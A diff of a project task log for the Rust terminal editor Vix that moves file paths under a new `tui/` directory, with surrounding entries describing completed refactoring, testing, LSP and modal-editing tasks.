@@ -55,18 +55,18 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   (drops the unmaintained `serial`), and `anyhow`/`crossbeam-epoch`/`spin`
   updated off advisories. Duplicate majors are `warn`, not `deny`: 42 of them
   today, almost all `windows-*`. See `spec/ci/index.md`.
-- [x] **T004 — TUI snapshot harness.** Add `tests/snapshots.rs` (or a
+- [x] **T004 — TUI snapshot harness.** Add `tui/tests/snapshots.rs` (or a
   `vix-test-support` crate) that boots the App against ratatui
   `TestBackend` at 100×30, feeds scripted key events, and asserts golden
   text screens (insta `assert_snapshot!`). Document how to review/update
   snapshots in `agents/conventions.md`.
-  Done — `tests/snapshots.rs` with three scenarios (default screen, editor
+  Done — `tui/tests/snapshots.rs` with three scenarios (default screen, editor
   with typed content, command palette in Commands mode), a "Snapshot" layer
   in `spec/test/index.md` plus a "Snapshot testing" section on writing and
   reviewing them, and a pointer from `agents/conventions.md`. Locale is
   pinned to `en` per test (`rust_i18n::locale()` is process-global).
   Discovered along the way: the palette's **Files** mode has no sort at
-  all — `build_file_index`/`palette_file_entries` in `src/app.rs` push
+  all — `build_file_index`/`palette_file_entries` in `tui/src/app.rs` push
   matches in raw `ignore::WalkBuilder` order (filesystem-traversal order,
   not portable across ext4/APFS), unlike Commands mode which scores with
   `palette::fuzzy_score` and ties-breaks on a stable catalog index. Not
@@ -103,13 +103,13 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   fresh-PID re-runs before trusting it (still worth a real second machine
   or a CI dry-run before assuming any status-bar-adjacent snapshot is
   safe).
-- [x] **T006 — Benchmarks.** Add criterion benches (root `benches/` or in
+- [x] **T006 — Benchmarks.** Add criterion benches (root `tui/benches/` or in
   `vix-editor-core`): open/parse 100 MB synthetic file, 10k random inserts
   and deletes, syntax-highlight a 5 MB Rust file, workspace search over a
   generated 10k-file tree, palette fuzzy scoring over 10k candidates.
   `cargo bench` documented; record baseline numbers in a new
   `docs/performance/index.md`.
-  Done — `benches/` already existed (3 files, done in an earlier session
+  Done — `tui/benches/` already existed (3 files, done in an earlier session
   without checking this box) but at much smaller sizes than spec'd; widened
   `editor_ops.rs`'s `bench_open` to 125,000 lines (~5 MB, the
   syntax-highlight scenario) and 2,500,000 lines (~100 MB, the open/parse
@@ -177,7 +177,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   so there is no cross-statement visibility race in the connect → browse →
   query → filter → delete flow to chase — a DELETE is fully committed on
   the worker before the next statement is even dequeued. The real bug was
-  in the *test harness's* own wait: `tests/db_smoke.rs`'s `key()` drained
+  in the *test harness's* own wait: `tui/tests/db_smoke.rs`'s `key()` drained
   `poll_query()` in a loop bounded by a **fixed 1,000,000-iteration spin
   count**, which has no relationship to actual wall-clock time. On a
   contended `ubuntu-latest` runner (many parallel `cargo test` threads
@@ -288,7 +288,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   path and a revisit condition, same pattern as the pre-existing `paste`/
   RUSTSEC-2024-0436 entry. `spec/index.md` and `agents/share/crate-map.md`
   updated to reflect the engine core being done and T103+ still pending
-  (no palette entry, no startup load, nothing called from `src/app.rs`
+  (no palette entry, no startup load, nothing called from `tui/src/app.rs`
   yet).
 - [x] **T103 — Host wiring.** App shell: load scripts at startup, surface
   registered commands in the palette (prefixed, e.g. `script:`), execute
@@ -324,11 +324,11 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   fields, `main.rs` startup, palette/menu/prompt integration), gating it
   behind an opt-out feature would mean `--no-default-features` either
   fails to build the App shell or needs `#[cfg(feature = "scripting")]`
-  sprinkled through several already-large files (`src/app.rs`, `src/ui.rs`)
+  sprinkled through several already-large files (`tui/src/app.rs`, `tui/src/ui.rs`)
   — including inside two `macro_rules!` dispatch tables
   (`try_panel_key`'s `panel!`, `overlay_capturing_keys`'s `any_open!`) that
   don't support per-fragment `#[cfg]` at all. Same call T111 made for
-  `vix-modal`, for the same reason. 5 new `tests/integration.rs` cases
+  `vix-modal`, for the same reason. 5 new `tui/tests/integration.rs` cases
   (command run via action + via palette, reload picks up a new script,
   read-only blocks an edit, prompt round-trips to a fresh handler call).
 - [x] **T104 — Script keybindings (audit + spec).** Allow scripts to bind
@@ -337,7 +337,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   Done as an audit + spec, not an implementation — the premise didn't
   hold. There is no existing "keymap-model override layer": `vix-keymap-
   model` only covers *which* keymap is active, not user-rebindable keys,
-  and none of the 9 keymap dispatch functions in `src/app.rs` (`vim_
+  and none of the 9 keymap dispatch functions in `tui/src/app.rs` (`vim_
   normal_key`, `emacs_key`, `vscode_key`, `intellij_key`, `eclipse_key`,
   `sublime_key`, `global_key`/`apple_ctrl_key`, `global_shared_key`,
   `spacemacs_key`) are backed by a queryable table — only Emacs/Spacemacs's
@@ -405,7 +405,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   top-level Ctrl and Meta bindings now show up in the F1 help overlay too
   (only the five chord tables ever did before). Zero intended behavior
   change: full existing 421-test suite stayed green throughout, plus 7
-  new `vix-keybindings` unit tests and 3 new `tests/integration.rs` cases
+  new `vix-keybindings` unit tests and 3 new `tui/tests/integration.rs` cases
   covering previously-untested contexts (`C-c C-x`, `C-c p c`, and the
   Meta document-bounds bindings).
 - [x] **T104b — Vim + Spacemacs.** Convert `vim_normal_key`'s table (shared
@@ -438,7 +438,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   `crates/vix-keybindings` changes) and branching from a clean `main`
   before continuing, no rework needed. Zero intended behavior change:
   full 425-test suite green throughout, plus 5 new `vix-keybindings`
-  unit tests and 1 new `tests/integration.rs` case covering the insert-
+  unit tests and 1 new `tui/tests/integration.rs` case covering the insert-
   entry variants (`a`/`A`/`I`/`o`/`O`) and `yy`, none of which the
   existing Vim tests happened to exercise.
 - [x] **T104c — VS Code.**
@@ -491,7 +491,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   table lists the Shift variant as an explicit duplicate row rather than
   silently dropping it or "improving" it into a distinct binding.
   **Found and fixed a real, pre-existing test bug** while looking for
-  IntelliJ coverage to extend: `tests/integration.rs`'s
+  IntelliJ coverage to extend: `tui/tests/integration.rs`'s
   `intellij_and_eclipse_keymaps_bind_find` used the keymap ids
   `"intellij-mac"`/`"intellij-win"` (not the real `vix-keymap-model` ids,
   `"intellij-macos"`/`"intellij-windows"`) — `Keymap::from_id` silently
@@ -701,12 +701,12 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   was already fully exercised by T104i's 7 tests; this task is pure
   `App`-side wiring).
 
-- [x] **T105 — Sample scripts + docs.** ~6 scripts in `examples/scripts/`
+- [x] **T105 — Sample scripts + docs.** ~6 scripts in `tui/examples/scripts/`
   (e.g. wrap-selection-in-markdown-link, insert-file-header,
   title-case-line, dedupe-selection, timestamp-signature, open-scratch-
   with-template); write `docs/scripting/index.md` documenting the full
   API v1 with each sample explained.
-  Done — all 6 named samples, in `examples/scripts/*.rhai`, each verified
+  Done — all 6 named samples, in `tui/examples/scripts/*.rhai`, each verified
   by actually running it through `vix_script::Runtime` (not just eyeballed
   for plausible-looking Rhai — real interpreter probes caught two genuine
   syntax traps along the way: Rhai's `.trim()` mutates in place and
@@ -714,7 +714,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   Markdown link and a literal `` `[text](url)` `` demonstrating link
   syntax both trip `scripts/check-docs`'s "does this resolve to a file"
   check, the exact gotcha the `vix-spec-change` skill already warns
-  about). New `tests/example_scripts.rs` (7 tests) loads every sample via
+  about). New `tui/tests/example_scripts.rs` (7 tests) loads every sample via
   real discovery and invokes each handler, so they can't silently rot —
   the same "docs are checked like code" principle `scripts/check-docs`
   already applies to links.
@@ -777,7 +777,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   macros — Vix already has macros). Merge the spec.
   Done — new `vix-modal` crate (design-only, same no-op-crate-plus-spec
   shape as T101/`vix-script`). The audit in `spec/index.md` cites the
-  actual `src/app.rs` dispatch precisely: `vim_normal_key`'s `vim_pending`
+  actual `tui/src/app.rs` dispatch precisely: `vim_normal_key`'s `vim_pending`
   supports only three hardcoded 2-key sequences (`gg`/`dd`/`yy` — `d`/`c`
   plus any other motion is silently swallowed), no count state exists, no
   named registers (everything goes through the single OS clipboard), no
@@ -823,7 +823,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
 - [x] **T112 — Mode engine.** Done 2026-09-14. `vix-modal` crate gained the
   `Mode` enum (`Normal`/`Insert`/`Visual`/`VisualLine`, `status_label()` for
   the status bar) plus a new `Settings::modal_engine: bool` (default off).
-  Host wiring lives in a new `src/app/modal.rs`: `App::modal_key` is tried
+  Host wiring lives in a new `tui/src/app/modal.rs`: `App::modal_key` is tried
   first from `vim_key`/`spacemacs_key`, before `vim_normal_key`'s existing
   table — a no-op whenever the setting is off, so today's Vi/Spacemacs
   behavior is unchanged by default. This slice: `v`/`V` enter Visual/Visual
@@ -844,7 +844,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   Keymap) reset `modal_insert` but not the new `modal_mode`, so a Vi→Vi
   reswitch while in Visual mode left the status bar stuck; fixed in
   `reset_keymap_modes`. 5 new integration tests
-  (`tests/integration/modal.rs`) — one caught a test-file-path race
+  (`tui/tests/integration/modal.rs`) — one caught a test-file-path race
   (`unique_dir` tags shared across parallel tests), one caught the
   anchor-tracking bug above. `vim_normal_key`'s table still owns everything
   else unchanged; T113+ narrows that fallback as real motions/operators
@@ -922,7 +922,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   Vim's own "yank was never dot-repeatable either"; `c` and a plain
   Insert-mode session are excluded too, a deliberately scoped-out follow-on
   — replaying typed Insert-mode text needs a recording hook outside
-  `src/app/modal.rs`, since those keys never reach `App::modal_key` at all
+  `tui/src/app/modal.rs`, since those keys never reach `App::modal_key` at all
   under T112's Insert-mode-passthrough design). `{count}.` overrides the
   recorded change's count by splicing the new count in wherever the first
   digit run in the recorded keys was (after a register prefix if any),
@@ -938,7 +938,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   and the dot-repeat gaps above. Updated `docs/for-vim-users/index.md`'s
   gap list to say exactly what v1 now covers, per this task's own
   instruction. 18 new unit tests (73 total in `vix-modal`) plus 11 new
-  integration tests (37 total in `tests/integration/modal.rs`), and a full
+  integration tests (37 total in `tui/tests/integration/modal.rs`), and a full
   `cargo test --test integration` run (542 tests, 0 failures) confirming
   the default flip doesn't regress any pre-existing Vi/Spacemacs-keymap
   test.
@@ -1010,7 +1010,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   everything after it. A smaller, unconditional fix landed alongside it:
   `App::new` scanned the custom-themes directory twice (once in
   `apply_saved_theme`, once again immediately after for the View → Theme
-  submenu); now scanned once, reused for both. New `benches/startup.rs`
+  submenu); now scanned once, reused for both. New `tui/benches/startup.rs`
   (`startup/app_new`, `startup/refresh_git`) gives this a lasting
   regression guard, the same way every other perf task in this run has.
   Full before/after story and numbers in `docs/performance/index.md`'s
@@ -1045,7 +1045,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   convention for the feature. New tests at all three layers: `vix-lsp-core`
   unit tests for the capability JSON, a `vix-lsp` mock-server integration
   test proving a JSON-RPC error surfaces as `RequestFailed`
-  (`tests/lsp_smoke.rs`), and an `App`-level end-to-end test driving a real
+  (`tui/tests/lsp_smoke.rs`), and an `App`-level end-to-end test driving a real
   `on_key('(')` through to a populated `App::hover` via a mock server.
   `crates/vix-lsp/spec/index.md`'s Features table rewritten and fact-checked
   against real action-id strings (caught and fixed one invented-wrong name,
@@ -1055,7 +1055,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
 - [x] **T123a — Semantic tokens.** Done 2026-09-17, picked up as part of
   T134's security/depth re-audit rather than deferred further, and scoped
   down from its own original ambition by a real finding made while
-  implementing it: every bundled theme (`themes/*.json`, all 20 of them)
+  implementing it: every bundled theme (`tui/themes/*.json`, all 20 of them)
   currently defines exactly **four** syntax colors —
   `comment`/`keyword`/`number`/`string` — not the far richer vocabulary
   (`function`, `type`, `variable`, …) the Tree-sitter `.scm` highlight
@@ -1115,7 +1115,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   language_id → that server's current report); `diagnostics_for`/
   `all_diagnostics` merge across servers at read time (now returning
   owned `Diagnostic`s/`Vec<Diagnostic>` rather than borrowed, since a
-  flattened merge can't be borrowed — the 4 call sites in `src/app*.rs`
+  flattened merge can't be borrowed — the 4 call sites in `tui/src/app*.rs`
   needed no changes beyond one `.iter()` → `.into_iter()` a real compile
   caught, since owned values support the same field access as borrowed
   ones). Both `publishDiagnostics` (push) and `workspace/diagnostic`
@@ -1135,7 +1135,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   (`configs_for_returns_every_server_configured_for_the_extension`,
   `diagnostics_from_two_servers_for_the_same_file_coexist` — the latter
   proves a second server clearing its own report doesn't touch the
-  first's), and a `tests/lsp_smoke.rs` mock-server test spawning two real
+  first's), and a `tui/tests/lsp_smoke.rs` mock-server test spawning two real
   (Python) mock processes against one file, proving both `didOpen` sees
   the file and both publish independently without clobbering.
 - [x] **T123c — Server crash recovery.** Done 2026-09-17, picked up as
@@ -1156,7 +1156,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   paths were ever synced (`lsp_synced`), so the very next
   `lsp_sync_active` tick (the active tab, if affected) or the next time a
   background tab becomes active treats it as a fresh open. New
-  `tests/lsp_smoke.rs` mock server that deterministically "crashes" (exits)
+  `tui/tests/lsp_smoke.rs` mock server that deterministically "crashes" (exits)
   right after every `didOpen` it handles, driving the full chain end to
   end: exactly 3 respawns, each correctly naming the crashed file for
   replay, then a `ServerCrashed` event instead of a 4th attempt.
@@ -1201,7 +1201,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   falls back to the pre-existing word-under-cursor guess rather than
   surfacing a scary error for an optional step — verified via a mock
   server returning both a real placeholder and a bare `null`
-  (`tests/lsp_smoke.rs`, 2 new tests). `relatedInformation`: `Diagnostic`
+  (`tui/tests/lsp_smoke.rs`, 2 new tests). `relatedInformation`: `Diagnostic`
   gained a `related: Vec<(Location, String)>` field
   (`vix_lsp_core::message::parse_related_information`, unit-tested), and
   `App::open_diagnostics_panel` shows each related location as its own
@@ -1244,7 +1244,7 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   registration-id-string case, `didChangeWorkspaceFolders` params shape),
   1 `vix-lsp` unit test (`add_workspace_folder` builds the right
   `(uri, name)` pairs and is a no-op on a duplicate), and a
-  `tests/lsp_smoke.rs` mock-server test that logs every message the
+  `tui/tests/lsp_smoke.rs` mock-server test that logs every message the
   server receives and asserts `initialize` named the one open folder
   while a later `add_workspace_folder` call produced exactly one
   `didChangeWorkspaceFolders` notification naming the new one.
@@ -1321,11 +1321,11 @@ Task IDs are stable — reference them in branch names (e.g. `feat/T101-ci`).
   opens the commit prompt pre-filled with the reply via a new
   `AiDest::GitCommitMessage` — fills the message box, never commits on its
   own; the user still reviews and presses Enter. New tests at both layers
-  that matter: `tests/integration/ai.rs` (new module — the *first* real
+  that matter: `tui/tests/integration/ai.rs` (new module — the *first* real
   test coverage `spawn_ai_cmd`/`AiReplace`/`poll_ai_replace` have ever had,
   Annotate/Improve/Summarize/Explain/Define included, all driven through a
   deterministic `printf`-based `ai_command` rather than a real assistant)
-  and a new throwaway-repo test in `tests/integration/git.rs` for the
+  and a new throwaway-repo test in `tui/tests/integration/git.rs` for the
   commit-message flow. `scripts/check` green throughout.
 
 ### Security & hardening
@@ -1484,7 +1484,7 @@ presupposing a specific vulnerability exists.
     chat panel, DB's NL→SQL, T125's 3 new features) and found none send a
     real filesystem path at all — buffer content and selections only,
     except the commit-message generator's `git diff --staged` input,
-    which necessarily carries *workspace-relative* paths (`src/app.rs`,
+    which necessarily carries *workspace-relative* paths (`tui/src/app.rs`,
     never `/Users/name/...`) because a commit message is meaningless
     without knowing which files changed. Redacting just those paths while
     still sending the full diff *content* of those same files would be
@@ -1500,20 +1500,20 @@ presupposing a specific vulnerability exists.
 
 Grounded in a measured pass on 2026-09-04 (numbers below are from that
 run; re-measure before starting any task). The headline: the discipline
-is good — 8 non-test `unwrap()` + 2 `expect()` in all of `src/app.rs`, 6
+is good — 8 non-test `unwrap()` + 2 `expect()` in all of `tui/src/app.rs`, 6
 real `TODO`/`FIXME` comments workspace-wide, only 4 `too_many_lines`
 allows in 61k lines of crate code — so the debt is **structural**
 (size, duplication, drift between hand-maintained copies), not
 sloppiness. Tasks are ordered roughly by payoff; each is its own branch
 and its own gate run, zero intended behavior change unless stated.
 
-- [x] **T141 — Carve up `src/app.rs`.** Done, all of it, in one session.
+- [x] **T141 — Carve up `tui/src/app.rs`.** Done, all of it, in one session.
   (see below). Originally 22,449 lines, 808 `fn`s, 767 string-literal
   match arms (grown to 23,058 lines/481 `#[test]`s-worth of scaffolding
   by the time T143 ran); `AGENTS.md`/`CLAUDE.md` describe "a thin App
   shell over ~106 focused crates" and this file is the opposite.
   Staged, not one rewrite: (a) move `impl App` blocks into
-  `src/app/<feature>.rs` submodules by feature — keymap dispatch (the
+  `tui/src/app/<feature>.rs` submodules by feature — keymap dispatch (the
   ten `*_key`/`*_token` fns, `on_key`), org, git, lsp/dap, palette,
   prompts/dialogs, scripts, tools, session/settings — pure moves, one
   module per branch, the test suite green after each; (b) split
@@ -1528,7 +1528,7 @@ and its own gate run, zero intended behavior change unless stated.
   `on_paste`, `command_as_control`, the ten keymap-style dispatchers and
   their `*_token` helpers, and the keymap-display helpers
   (`active_keymap`/`mode_indicator`/`which_key`/`ctrl`/`alt`/`shift`)
-  into new `src/app/keymap.rs` (~1490 lines) as its own `impl App`
+  into new `tui/src/app/keymap.rs` (~1490 lines) as its own `impl App`
   block — a plain `mod keymap;` in `app.rs`, no directory restructure
   needed. Every other feature's own `_key` handler (`git_panel_key`,
   `db_key`, …) stayed in `app.rs` and is called from `keymap.rs` exactly
@@ -1560,7 +1560,7 @@ and its own gate run, zero intended behavior change unless stated.
   with the line that opened it and nothing nested inside a method body
   can produce a bare 4-space-indented `    }` of its own — then delete
   bottom-up so earlier deletions never shift a not-yet-processed range's
-  line numbers) into new `src/app/git.rs`: `run_git_action` (the
+  line numbers) into new `tui/src/app/git.rs`: `run_git_action` (the
   `run_action` git-namespace dispatcher), the Git status/gutter/hunk/
   diff/conflict-resolution plumbing, the Git panel and its commands
   (stage/commit/branch/log/clone/blame/grep/remote), the branch chooser,
@@ -1574,7 +1574,7 @@ and its own gate run, zero intended behavior change unless stated.
   `git_commit`/`git_create_branch`/`git_clone`/`git_edit_description`/
   `git_delete_branch`/`git_grep`/`branch_key`/`branch_mouse`/
   `open_diff_with`/`diff_view_key`) called from `app.rs`'s remaining code
-  or from `src/app/keymap.rs` — a *sibling* module, not a parent, but
+  or from `tui/src/app/keymap.rs` — a *sibling* module, not a parent, but
   `pub(super)` still reaches it: visibility granted at the parent `app`
   extends to every descendant of `app`, `keymap` included. **Found, not
   fixed**: `run_git_action`'s match also dispatches the unrelated `run.*`
@@ -1589,7 +1589,7 @@ and its own gate run, zero intended behavior change unless stated.
   keybinding-editor code (`open_keybinding_editor`,
   `build_keybinding_rows`, `keybinding_editor_key`, …), which stayed in
   `app.rs` (not one of this epic's named slices). Moved into new
-  `src/app/scripts.rs` via the same cherry-pick-by-name script:
+  `tui/src/app/scripts.rs` via the same cherry-pick-by-name script:
   `load_scripts`/`reload_scripts`, the whole script-trust prompt flow
   (T132: `project_scripts_trusted`, `maybe_prompt_script_trust`,
   `maybe_reprompt_script_trust`, `queue_script_trust_prompt_if_any`,
@@ -1604,11 +1604,11 @@ and its own gate run, zero intended behavior change unless stated.
   `open_script_chooser`/`script_chooser_key`/`script_chooser_mouse`/
   `run_script_command`/`accept_script_prompt`/`script_palette_entries`)
   called from `app.rs`'s remaining `run_action`/`accept_prompt` or from
-  `src/app/keymap.rs`. Full workspace `cargo test` green throughout,
+  `tui/src/app/keymap.rs`. Full workspace `cargo test` green throughout,
   matching baseline exactly.
   **Slice 4 (command palette) done 2026-09-06**: mostly contiguous
   again, like slice 1 — `open_palette` through `accept_palette`, ~11
-  methods. Moved into new `src/app/command_palette.rs`, named
+  methods. Moved into new `tui/src/app/command_palette.rs`, named
   `command_palette` rather than `palette` because `app.rs` already
   imports the top-level `vix-palette` crate under the local name
   `palette` (`use crate::palette::{self, ...}`); a `mod palette;` here
@@ -1637,7 +1637,7 @@ and its own gate run, zero intended behavior change unless stated.
   `store_settings` through `save_session` is one clean run — plus 5
   outliers scattered further down (`ensure_project_session_loaded`,
   `fill_project_fields`, the workspace chooser's open/key/mouse trio,
-  `open_settings_file`). Moved into new `src/app/session.rs`; `App::new`
+  `open_settings_file`). Moved into new `tui/src/app/session.rs`; `App::new`
   and its `build_core` helper deliberately stayed in `app.rs` — the
   constructor itself is the entry point, not a feature to relocate.
   Needed `use super::{App, Focus, ProjectHistory, WorkspaceChooser,
@@ -1649,14 +1649,14 @@ and its own gate run, zero intended behavior change unless stated.
   `open_settings_file`) — nearly everything in the file needed it, since
   `run_action` and half the rest of `app.rs` call into session/settings
   plumbing constantly. Checked for a name collision before starting
-  (`grep -n "use crate::session" src/app.rs` found nothing — every
+  (`grep -n "use crate::session" tui/src/app.rs` found nothing — every
   reference was already fully-qualified `crate::session::...`), so
   `mod session;` was safe with no rename needed, unlike slice 4. Full
   workspace `cargo test` green throughout, matching baseline exactly.
   **Slice 6 (LSP + DAP) done 2026-09-06**: the largest and most
   scattered slice yet — 32 methods, 49 errors on the first build
   attempt (vs. single digits to ~20 for every prior slice), clean on
-  the second. Moved into new `src/app/lsp_dap.rs`, named `lsp_dap`
+  the second. Moved into new `tui/src/app/lsp_dap.rs`, named `lsp_dap`
   rather than a bare `lsp`/`dap` to stay unambiguous (no direct
   collision found — `app.rs` only ever references `crate::lsp`/
   `crate::dap` fully qualified or via function-body-local
@@ -1690,7 +1690,7 @@ and its own gate run, zero intended behavior change unless stated.
   the `node.*` transforms (nodeify, extract subtree, insert
   transclusion, rename by title, dead-links, reset). ~21 methods,
   mostly contiguous, one outlier (`refresh_backlinks_follow`). Moved
-  into new `src/app/roam.rs`. Needed `use super::{App, Prompt,
+  into new `tui/src/app/roam.rs`. Needed `use super::{App, Prompt,
   PromptKind};` plus `std::path::{Path, PathBuf}`, and `pub(super) fn`
   on 9 of the 21 methods (`roam_node_files`/`roam_action`/
   `roam_write_and_open`/`roam_visit_or_create`/`roam_insert_link`/
@@ -1701,7 +1701,7 @@ and its own gate run, zero intended behavior change unless stated.
   `TBLFM` tables) — `org_table_cursor_pos` through `org_table_action`
   (~20 methods incl. a `format_table_number` helper) and
   `open_column_view` through `org_columns_update_all_dblocks` (~7
-  methods). Moved into new `src/app/org_table.rs`, deliberately *not*
+  methods). Moved into new `tui/src/app/org_table.rs`, deliberately *not*
   named `column_view` — `app.rs` already has an unrelated top-level
   `crate::column_view` module (a different, crate-root module, always
   referenced fully qualified there, so no hard collision, but reusing
@@ -1720,7 +1720,7 @@ and its own gate run, zero intended behavior change unless stated.
   (SCHEDULED/DEADLINE), emphasis markup, capture end-to-end (chooser,
   template fields, review, filing, clock), and the built-in agenda
   (file scoping, view building, its own key handling). Moved into new
-  `src/app/org.rs`. Also fixed the slice-7 gap: `accept_roam_prompt`
+  `tui/src/app/org.rs`. Also fixed the slice-7 gap: `accept_roam_prompt`
   moved here too (not to `roam.rs`) — despite its name it's really the
   shared accept-handler for capture/roam/goto/workspace prompts, and
   groups better next to its siblings `accept_org_prompt`/
@@ -1745,7 +1745,7 @@ and its own gate run, zero intended behavior change unless stated.
   inline markers/blocks, dynamic UUID/ZID/date-time insertion, plus the
   color/unit converters, calculator, and regex tester (all share the
   "open an input overlay, insert its result" shape). Moved into new
-  `src/app/insert_tools.rs`, excluding two interlopers in the middle
+  `tui/src/app/insert_tools.rs`, excluding two interlopers in the middle
   (`surround`/`toggle_wrap` — general editing operations, not
   tools-menu snippets). Needed `use super::{App, SQL_CREATE_EXTENSION,
   SQL_CREATE_TABLE};` plus crossterm `KeyCode`/`KeyEvent`, and
@@ -1759,7 +1759,7 @@ and its own gate run, zero intended behavior change unless stated.
   glyph/color/type picker panels: Nerd Font character picker, ASCII-art
   character picker, X11 color picker, media type catalog, and the QR
   code generator (each an "open, arrow/click to select, insert"
-  overlay). 17 methods, moved into new `src/app/picker_panels.rs`.
+  overlay). 17 methods, moved into new `tui/src/app/picker_panels.rs`.
   `active_media_type` sits right next to this cluster by line number
   but stayed in `app.rs` — it's the snippet library's own media-type
   detection, not part of the media-type *panel*, despite the similar
@@ -1772,7 +1772,7 @@ and its own gate run, zero intended behavior change unless stated.
   file-info and text-info panels, Markdown preview, the Snippets
   picker (with its tabstop-expansion session and the active buffer's
   media-type-scoped library), and the System Info panel. Moved into
-  new `src/app/info_panels.rs`. Needed `use super::{App, ContactPanel,
+  new `tui/src/app/info_panels.rs`. Needed `use super::{App, ContactPanel,
   FileInfoPanel, MarkdownPreview, SnippetSession, SystemInfoPanel,
   TextInfoPanel, VcardPanel, rect_contains}; use crate::editor::Tab;`
   plus crossterm key/mouse types, and `pub(super) fn` on 21 of the 32
@@ -1790,9 +1790,9 @@ and its own gate run, zero intended behavior change unless stated.
   not into a cross-cutting "prompts" module that would just recreate the
   same scattering this epic is trying to remove.
   **T141 is now fully complete — 12 slices plus the `run_action` split,
-  all in one session, `src/app.rs` down from 23,058 lines to 13,919
+  all in one session, `tui/src/app.rs` down from 23,058 lines to 13,919
   (~40% cut) into a thin(ner) shell plus 12 focused
-  `src/app/*.rs` submodules**: `keymap.rs` (on_key + the ten keymap
+  `tui/src/app/*.rs` submodules**: `keymap.rs` (on_key + the ten keymap
   dispatchers), `git.rs` (git + jj version control), `scripts.rs`
   (script loading/trust/chooser), `command_palette.rs` (the `Ctrl+P`
   palette), `session.rs` (session/settings persistence),
@@ -1836,9 +1836,9 @@ and its own gate run, zero intended behavior change unless stated.
   whole class of `#[cfg(test)]`-only errors); and never trusting a gate
   result piped through `tail`/`head` (it silently reports the pipe's
   own exit code, not the command's).
-- [x] **T142 — Same for `src/ui.rs`.** Done, 14 slices, 2026-09-06
+- [x] **T142 — Same for `tui/src/ui.rs`.** Done, 14 slices, 2026-09-06
   through 2026-09-08. `ui.rs` went from 7,293 to 713 lines (a 90% cut)
-  across 21 new `src/ui/*.rs` submodules: `db.rs`, `info_panels.rs`,
+  across 21 new `tui/src/ui/*.rs` submodules: `db.rs`, `info_panels.rs`,
   `picker_panels.rs`, `edit_surfaces.rs`, `choosers.rs`, `menu_bar.rs`,
   `dialogs.rs`, `file_browser.rs`, `ai_terminal.rs`, `search.rs`,
   `help.rs`, `lsp_popups.rs`, `tool_panels.rs`, `explorer.rs`,
@@ -1863,7 +1863,7 @@ and its own gate run, zero intended behavior change unless stated.
   the topic memory file). Same technique as T141 throughout: the
   rustfmt column-0-closing-brace extraction script
   (`extract_ui_module.py`, adapted for free `fn`s instead of `impl`
-  methods), a `git checkout -- src/ui.rs` + corrected-TARGETS restart
+  methods), a `git checkout -- tui/src/ui.rs` + corrected-TARGETS restart
   on the one real miss (slice 4), a shell-concatenation build for
   bodies too large to safely hand-retype (slices 10, 12, 13, 14), and
   full `cargo build --all-targets` / `cargo test --workspace` /
@@ -1871,7 +1871,7 @@ and its own gate run, zero intended behavior change unless stated.
   not just the aggregate count) / `scripts/check` on every single
   slice before merging. A genuine architecture conflict surfaced right
   at the start (T142's original wording vs. `AGENTS.md`'s "rendering
-  lives only in `src/ui.rs`" hard rule) — resolved by keeping the hard
+  lives only in `tui/src/ui.rs`" hard rule) — resolved by keeping the hard
   rule and revising this task's own wording, per the user's explicit
   choice. Full slice-by-slice history below, starting from the
   original opening note:
@@ -1883,13 +1883,13 @@ and its own gate run, zero intended behavior change unless stated.
   and this task's original wording — "move each `draw_*` next to its
   state, into the owning crate where one exists" — turned out to
   directly contradict `AGENTS.md`'s own non-negotiable hard rule,
-  "Rendering lives only in `src/ui.rs`", which several panel crates'
+  "Rendering lives only in `tui/src/ui.rs`", which several panel crates'
   own doc comments independently restate, e.g. `vix-clock-panel`: "pure
   logic... does no rendering, so the host draws it and the logic stays
   unit-testable without a terminal." Checked with the user rather than
   picking a side: **the hard rule stays, this task's wording changes**):
-  move each overlay/panel's `draw_*` into `src/ui/<feature>.rs`
-  submodules — same crate, same pattern T141 used for `src/app.rs`,
+  move each overlay/panel's `draw_*` into `tui/src/ui/<feature>.rs`
+  submodules — same crate, same pattern T141 used for `tui/src/app.rs`,
   never into a panel's own crate — and split the three 100+-line
   drawers so the `too_many_lines` allows come out.
   **Slice 1 (info panels) done 2026-09-06** — the first T142 slice.
@@ -1901,7 +1901,7 @@ and its own gate run, zero intended behavior change unless stated.
   `impl App` methods. Moved a clean contiguous block — `draw_contacts`
   through `draw_system_info` (7 functions: the Contacts vCard view,
   file-info/text-info panels, Markdown preview, Snippets picker, System
-  Info panel) — into new `src/ui/info_panels.rs`. Needed
+  Info panel) — into new `tui/src/ui/info_panels.rs`. Needed
   `use super::draw_scrollbar;` (a shared helper still in `ui.rs`) plus
   `use crate::app::App; use crate::theme::{self, icon};` and the same
   `ratatui::prelude::*`/`widgets::{...}` imports `ui.rs` itself already
@@ -1910,15 +1910,15 @@ and its own gate run, zero intended behavior change unless stated.
   `pub(super)`, and added `mod info_panels; use info_panels::{...};` to
